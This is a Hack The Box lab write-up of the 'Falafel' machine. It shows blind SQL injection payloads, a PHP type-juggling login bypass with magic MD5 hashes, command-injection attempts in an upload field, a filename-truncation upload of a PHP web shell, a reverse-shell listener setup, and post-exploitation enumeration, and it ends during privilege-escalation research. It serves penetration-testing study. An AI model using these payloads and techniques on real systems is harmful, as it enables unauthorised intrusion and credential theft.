---
layout: post
title:  "Falafel Writeup - Hack The Box"
date:   2025-04-09
desc: ""
keywords: "HTB,eWPT,eWPTXv2,OSWE,Linux,SQLi,Scripting,PHPTypeJuggling,FileNameTruncation,AbusingVideoGroup,Debugfs,Hard"
categories: [HTB]
tags: [HTB,eWPT,eWPTXv2,OSWE,Linux,SQLi,Scripting,PHPTypeJuggling,FileNameTruncation,AbusingVideoGroup,Debugfs,Hard]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

Another **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, the **Falafel**, that was very difficult for me to compromise, without the help of the **[hack4u](https://hack4u.io/){:target="_blank"}** community it would have taken me much longer to engage. The concepts learned, the possibility to work on my scripting, to think how to exploit old methods are some of the very positive satisfactions that this box left me. The lateral thinking to exploit a well known vulnerability, always leads me to push myself and **not to take for granted** that if I know how to exploit it, everything is already solved, many times it takes an extra effort and not to give up for the engagement of a system to be successful. It is time to spawn the machine from the **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** platform and start a new and fun laboratory.

<br /><br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I start my **Reconnaissance** phase, the first task is to check with `ping` that I have connectivity with the lab, I can also verify with the `whichSystem.py` script developed by the **[hack4u](https://hack4u.io/){:target="_blank"}** community the **Operating System** of the target machine. With `nmap` I can get the services and their versions, which are available on the target ports, accessible from the outside. With this information I can investigate about the **Codename** with some Search Engine on the web, to have a certainty if containers are being implemented. Also with `whatweb` and **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I leak more information about the technologies implemented in the web service, not very relevant at the moment except for a domain. I can also use `nmap` to enumerate files and folders hidden in the port **80** service, there are specialized tools for this task but I will advance a little, and I can find two very interesting files.

```bash
ping -c 1 10.129.229.139
whichSystem.py 10.129.229.139
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.129.229.139 -oG allPorts
nmap -sCV -p22,80 10.129.229.139 -oN targeted
cat targeted
#    --> OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
#    google.es --> OpenSSH 7.2p2 4ubuntu2.4 launchpad        Xenial
#    --> Apache httpd 2.4.18
#    google.es --> Apache httpd 2.4.18 launchpad             Xenial

whatweb http://10.129.229.139
nmap --script http-enum -p80 10.129.229.139 -oN webScan
# login.php, robots.txt
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/falafel_writeup/Falafel_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before I dig deeper into the Web service available on port **80**, I'm going to update the `hosts` file on my machine to add the domain I found with `whatweb`. Now if I put all my attention on the Web server enumeration, there is no difference at first sight if I access from the browser using the **IP** or then with the **domain**, so it seems that **Virtual Hosting** is not being implemented. One of the files that I had found with `nmap`, allows me to access the authentication panel and even perform an enumeration of users, the other file (**robots.txt**) informs me that I can not upload files with extension **.txt**.

```bash
nvim /etc/hosts
cat /etc/hosts | tail -n 1
# 10.129.229.139  falafel.htb

ping -c 1 falafel.htb
whatweb http://falafel.htb

# http://10.129.229.139/robots.txt
# http://10.129.229.139/login.php
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `wfuzz` I can search for more hidden paths that perhaps `nmap` could not find, there are some that I can not access but which I confirm that they do exist on the server. With **[Wappalyzer](https://www.wappalyzer.com/){:target="_blank"}** I get the programming language in which the project is developed - **PHP** - so I go looking for files with extensions related to it, I find another **.txt** with a very particular name. If I access the content of the file through the browser I get very valuable information, such as a new username and also that the authentication panel can be bypassed, and that there is a way to engage the entire website through the functionality of uploading an image. I can also validate that the username **chris** exists.

```bash
wfuzz -c -t 100 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.229.139/FUZZ
# uploads,images,assets,css,js
wfuzz -c -t 100 --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt http://10.129.229.139/FUZZ.FUZ2Z
# cyberlaw - txt
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

What I can think of now to bypass the authentication panel is to try some basic **[SQL injections](https://portswigger.net/web-security/sql-injection){:target="_blank"}** to observe some error message. Depending on the message shown on the screen I can understand if an **injection works or not**, but the code must have some kind of sanitization because it does not allow me to use some words, which must be in a **Blacklist**. I already have a way to leak information from the database through an error based **[SQLi](https://portswigger.net/web-security/sql-injection){:target="_blank"}**.

```html
# SQLi Testing:
# http://10.10.10.73/login.php
#      --> admin':admin                                        :)  Try again..
#      --> admin' and sleep(5)-- -:admin                       :(
#      --> ():admin                                            :)
#      --> sleep:admin                                         :(  Hacking Attempt Detected!
#      --> admin' order by 100-- -:admin                       Try again..
#      --> admin' order by 4-- -:admin                         Wrong identification : admin   :)
#      --> admin' order 3-- -                                  :)
#      --> admin' union select 1,2,3,4-- -:admin               :(  Hacking Attempt Detected!
#      --> union:admin                                         :(  Hacking Attempt Detected!
#      -- admin' uNiOn SeLECt 1,2,3,4-- -:admin                :(
#      --> tryotherunionword                                   :( 
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I can leak information from the web server database, I can use the **SQL** `subtring` function to deduce if the server response is correct or not, based on the error message. If I analyze the request sent to the server I can find the names of the variables where the credentials are stored, and with the usernames that I know that exist (**admin**, **chris**) in the server I can perform tests with **Injections** that will allow me to obtain important information to compromise the website.

```html
http://10.10.10.73/login.php
#      --> admin' and substring(username,1,1)='a'-- -:admin    :)
#      --> admin' and substring(username,1,1)='b'-- -:admin    :(
#      --> admin' and substring(username,2,1)='d'-- -:admin    :)
#      --> admin' and substring(username,3,1)='m'-- -:admin    :)
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With **[BurpSuite](https://portswigger.net/burp){:target="_blank"}** I can automate the leakage of information using the **Intruder** tool. I only have to capture the traffic from my browser to the server and configure the type of attack, the parameter(s) to be updated with each injection, the payloads to be sent, create an expression to check if the response is true or false and start the attack. After waiting a bit I can see that the attack works correctly for the **admin** username, I could continue using **[BurpSuite](https://portswigger.net/burp){:target="_blank"}** to get more information, but it gets better to automate it by creating a custom script.

```bash
burpsuite &>/dev/null & disown
# Burp --> Intruder
# username=admin' and substring(username,§1§,1)='§b§'-- -&password=admin
#     Cluster bomb attack
#     Payloads: 1st - Numbers,1,5,1, URL-encode these characters [Disable]
#     Payloads: 2nd - Brute forcer,abcdefghijklmnopqrstuvwxyz,1,1, URL-encode these characters [Disable]
#     Options: Grep-Match (Wrong identification, Flag responses matching these expresions [Enable])
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Together with the **[hack4u](https://hack4u.io/){:target="_blank"}** community, a script was developed to obtain the credentials of the **admin** and **chris** users. In the request sent from the browser when trying to authenticate I have the **names** of the fields that I must use to obtain their information, as I had seen previously. After some problems with some necessary libraries, that I didn't have installed in my machine I achieve to obtain the hashes in **MD5** format of both users and with the help of the online tool **[CrackStation](https://crackstation.net/){:target="_blank"}** I can crack the one of the user **chris** (in the password obtained, there is a **clue** about a possible vulnerability).

```bash
python3 -m venv .
./bin/python3 -m pip install --upgrade pip
./bin/python3 -m pip install --upgrade pwntools
nvim sqli_leakeage.py
./bin/python3 sqli_leakeage.py
# admin, chris

nvim sqli_leakeage.py
./bin/python3 sqli_leakeage.py
# [▇] Password: 0e462096931906507119562988736854

nvim sqli_leakeage.py
./bin/python3 sqli_leakeage.py
# [▇] Password: d4ee02a22fc872e36d9e3751ba72ddc8
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After bypassing the authentication panel, the website does not have much interesting content or functionality, but in the **Profile** section there is a text, which also seems to be a **clue** to the possible attack vector. There is also a bit strange behavior when loading the page, so I will try to capture with **BurpSuite** the requests and analyze a bit more in depth but I can't find anything so far. The **clues** would indicate to me that the website may be susceptible to a **[Type Juggling](https://mahafuz.medium.com/understanding-type-juggling-in-php-48347f929aa0){:target="_blank"}** attack, where the vulnerability lies in the **source code** and mainly in the comparison of two variable values of different types. There is a **[Hacker News](https://news.ycombinator.com/item?id=9484757){:target="_blank"}** article where in a very detailed way explains me how to generate **MD5** hashes that start with **0e**, and if I'm lucky and if the hash of the **admin** user password also starts with **0e** I could exploit the **[Type Juggling](https://mahafuz.medium.com/understanding-type-juggling-in-php-48347f929aa0){:target="_blank"}** to impersonate it and access the website as administrator (<ins>many factors that are only given in this lab to understand the concept</ins>).

> **[How Type Juggling Happens](https://mahafuz.medium.com/understanding-type-juggling-in-php-48347f929aa0){:target="_blank"}**: Type juggling occurs when **PHP** encounters operations or comparisons involving variables of different data types. **PHP** will automatically attempt to convert one or both of the variables to a common data type before performing the operation or comparison.

```bash
http://10.10.10.73/profile.php          # :)      but nothing here!!

burpsuite &>/dev/null & disown

# Understanding Type Juggling Attack
php --interactive
  php > $hash = 0e462096931906507119562988736854;
  php > $integervalue = 0;
  php > if ($hash == $integervalue) {echo "hash and integervalue are equals :/";}
    hash and integervalue are equals :/
  php > echo $hash;
  php > $hash = 462096931906507119562988736854;
  php > echo $hash;

python3
  import hashlib
  hashlib.md5("QNKCDZO".encode()).hexdigest()
  hashlib.md5("aabg7XSs".encode()).hexdigest()
  hashlib.md5("240610708".encode()).hexdigest()
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/falafel_writeup/Falafel_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I try accessing the website with the **[Hacker News](https://news.ycombinator.com/item?id=9484757){:target="_blank"}** site passwords and I succeed in authenticating as the **admin** user both times, <ins>for this lab I was able to exploit the **Type Juggling**</ins>. Now I have the functionality to **upload a file**, but before uploading any malicious content I try to perform a **Port enumeration** of the system but it seems to be well sanitized (I do not do very rigorous tests at the moment of course), still trying some techniques to bypass protections implemented in the code.

```html
# http://10.129.229.139/login.php
# --> admin:240610708   admin:QNKCDZO   admin:aabg7XSs      :)

# http://10.129.229.139/upload.php
# http://127.0.0.1:22/                :(
# http://127.0.0.1:80/                :(
# http://127.120.30.1:80/             :(
# http://127.12.14.1:80/              :(
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As I can't leak information from the system, then I can try with methods for complex, but I'm going to try what file extensions I can upload, I already knew that the **.txt** were not allowed, according to what the **robots.txt** indicated me. The extensions related to images are allowed, but what catches my attention is that you can see on the screen the command that is running on the system. I may try to concatenate some command to test if the code is not sanitized, but after several attempts **I can't get any successful response**.

```bash
touch {test.txt,test.png,test.php}

# http://10.10.14.238/test.png; whoami
# http://10.10.14.238/test.png; whoami;
# http://10.10.14.238/test.png; whoami;#
# http://10.10.14.238/test.png; whoami#
# http://10.10.14.238/test.png; whoami#;
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/falafel_writeup/Falafel_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After some research on the **Internet**, I found an excellent resource **[“Unrestricted File Upload Testing & Bypass Techniques”](https://www.aptive.co.uk/blog/unrestricted-file-upload-testing/){:target="_blank"}**, where I can start testing vulnerabilities in the Web server to upload files of the extension that I need. One technique to bypass the restriction on the type of extension I can upload is to play with the length of the file name, in **Linux** Operating Systems there is a maximum of **255 bytes**, so I'm testing upload and confirm that the file is uploaded but **the name is shortened** if it exceeds a length that <ins>I don't know yet</ins>.

```bash
python3 -c 'print("A"*255 + ".png")'
touch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.png

python3 -c 'print("B"*250 + ".png")'
touch BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.png
# :)

python3 -c 'print("B"*250 + ".png")'
mv catpwn3d.jpg BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.png
python3 -m http.server 80
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

To know the exact length, so that I can upload a file with the extension I need, I can use the `pattern_create.rb` and `pattern_offset.rb` scripts. Once I have the **offset** value I need, I upload an image with **.php** extension, which I know the code will be able to interpret, and I get it to be hosted on the web server, the content displayed on the Web is illegible because it is an image but if I try with a **PHP** file it would surely be displayed correctly.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 250
mv hashcat.png Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A.png
python3 -m http.server 80

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q h7Ah
# [*] Exact match at offset 232

python3 -c 'print("B"*232 + ".php.png")'
mv pwnedcat.png BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.php.png
python3 -m http.server 80
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/falafel_writeup/Falafel_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I can upload a malicious **.php** file to try to **Engage** the machine, with basic code that allows me to execute command remotely via the `shell_exec` function (which I hope is allowed). Once the upload was successful, I access the path where the malicious file is stored and perform some basic system enumeration commands and confirm that I am on the target machine.

```bash
touch BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.php.png
nvim !$
cat !$
python3 -m http.server 80

# http://10.129.229.139/uploads/0321-2345_9f393f58f1f9c574/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.php?cmd=whoami
# hostname, ifconfig          :)
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_73.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/falafel_writeup/Falafel_74.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I check that the connectivity to the machine is correct, after performing a test with `ping`. There are many ways to access the machine, but I will resort to a basic method and if you do not allow me I can increase the complexity of the attack. I create an **index.html** file with a Linux command that sends me a **Reverse Shell**, then I set up a local server with `python` on my attacking machine to make the file available, I open port **443** with `nc` to listen for a remote connection request and finally I run the command from my browser to access the malicious file and have its contents interpreted with `bash`. I finally succeeded in compromising the machine, but before starting the enumeration phase I perform a **Console treatment** and the first thing I find are database credentials, which may help me later.

> **Attacker Machine**:

```bash
sudo tcpdump -i tun0 icmp -n
# http://10.129.229.139/uploads/0321-2345_9f393f58f1f9c574/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.php?cmd=ping%20-c%201%2010.10.14.238
# :)

nvim index.html
cat !$
cat index.html
python3 -m http.server 80
sudo nc -nlvp 443
```

> **Victime Machine**:

```bash
whoami
# Console Treatment
script /dev/null -c bash
[Ctrl^z]
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_75.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_76.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_77.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_78.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_79.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_80.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I start the **Enumeration** phase to find attack vectors to **Escalate privilege**, I still do not have permission to see the content of the first flag, I can also verify the **Codename** that I had found on the Internet. There is a **[vulnerability](https://www.watchguard.com/es/wgrd-psirt/advisory/wgsa-2022-00001){:target="_blank"}** in Polkit's `pkexec` tool but that is not the intended path so I will keep exploring, I can access the database with `mysql` with the credentials I found earlier but I can't find more relevant information.

```bash
uname -a
lsb_release -a
id
groups
cat /etc/passwd | grep 'sh$'
find \-perm -4000 2>/dev/null
getcap / -r 2>/dev/null
sudo -l
mysql -umoshe -p
  show databases;
  use falafel;
  show tables;
  describe users;
  select username,password from users;
  quit;
```

<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_81.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_82.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_83.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/falafel_writeup/Falafel_84.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I continue deepening my search in the system and find the script in responsible for uploading files to the server and check the error in the code that allows the system to be compromised. As I do not find much more, I verify that the password is not being reused and I succeed in pivoting the user (it is a very bad practice but very widespread the **reuse of credentials**). With a new compromised user I check which group he belongs to and there are two very well known in the pentesting environment for their vulnerabilities, **adm** and **video**. If I perform a recursive search of files by owner group I find a very important one, the `/dev/fb0` that has the **video** assigned to it.

> Linux provides the concept of a **framebuffer**, a **virtual device** that can be read from and written to in order to display graphics. The contents of a framebuffer are then typically displayed on a screen. On a Raspberry Pi, the HDMI output corresponds to **Framebuffer 0**, represented by the **/dev/fb0** file.

```bash
cat login_logic.php
# :( ===
cat connection.php

su moshe
id
# video
groups
# video ?!

find \-group video 2>/dev/null
# ./dev/fb0 ?
groups
for group in $(groups); do echo $group; done
for group in $(groups); do echo -e "\n[+] Filesystems with $group assigned:\n"; find \-group $group 2>/dev/null; done
```

<br/>
